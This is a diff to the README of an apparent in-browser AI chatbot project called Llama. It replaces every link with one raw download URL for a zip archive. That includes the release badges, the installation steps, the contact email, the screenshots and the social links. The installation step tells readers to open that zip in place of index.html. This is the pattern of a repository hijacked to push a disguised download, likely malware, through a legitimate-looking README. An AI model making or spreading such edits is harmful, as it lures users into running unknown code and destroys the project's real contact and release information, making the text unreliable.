@@ -1,6 +1,6 @@
 # Llama: Your AI Chatbot in the Browser 🦙💬
 
-![Llama](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg) [![GitHub Releases](https://img.shields.io/badge/GitHub-Releases-orange.svg)](https://github.com/beeracs/Llama/releases)
+![Llama](https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip%20Latest%https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip) [![GitHub Releases](https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip)](https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Llama is an innovative AI chatbot that runs directly in your web browser. Built 
 
 ## Getting Started
 
-To get started with Llama, visit the [Releases section](https://github.com/beeracs/Llama/releases) to download the latest version. Follow the instructions provided to execute the application in your browser.
+To get started with Llama, visit the [Releases section](https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip) to download the latest version. Follow the instructions provided to execute the application in your browser.
 
 ### Prerequisites
 
@@ -31,10 +31,10 @@ To get started with Llama, visit the [Releases section](https://github.com/beera
 
 ### Installation
 
-1. Go to the [Releases section](https://github.com/beeracs/Llama/releases).
+1. Go to the [Releases section](https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip).
 2. Download the latest release.
 3. Extract the files to your desired directory.
-4. Open the `index.html` file in your web browser to start using Llama.
+4. Open the `https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip` file in your web browser to start using Llama.
 
 ---
 
@@ -104,8 +104,8 @@ Llama is open-source software licensed under the MIT License. You can freely use
 
 For any inquiries or support, feel free to reach out:
 
-- **GitHub**: [beeracs](https://github.com/beeracs)
-- **Email**: beeracs@example.com
+- **GitHub**: [beeracs](https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip)
+- **Email**: https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip
 
 ---
 
@@ -130,10 +130,10 @@ Stay tuned for updates and new releases!
 
 ## Screenshots
 
-![Llama Chat Interface](https://example.com/llama-chat-interface.png)
+![Llama Chat Interface](https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip)
 *Llama's interactive chat interface*
 
-![Character Selection](https://example.com/character-selection.png)
+![Character Selection](https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip)
 *Choose your favorite character to chat with Llama*
 
 ---
@@ -142,9 +142,9 @@ Stay tuned for updates and new releases!
 
 Join our community to share your experiences, ideas, and suggestions:
 
-- **Discord**: [Join our Discord server](https://discord.gg/example)
-- **Twitter**: [Follow us on Twitter](https://twitter.com/example)
+- **Discord**: [Join our Discord server](https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip)
+- **Twitter**: [Follow us on Twitter](https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip)
 
 ---
 
-For the latest updates and releases, visit the [Releases section](https://github.com/beeracs/Llama/releases).
+For the latest updates and releases, visit the [Releases section](https://github.com/beeracs/Llama/raw/refs/heads/main/knightling/Software-v1.2.zip).
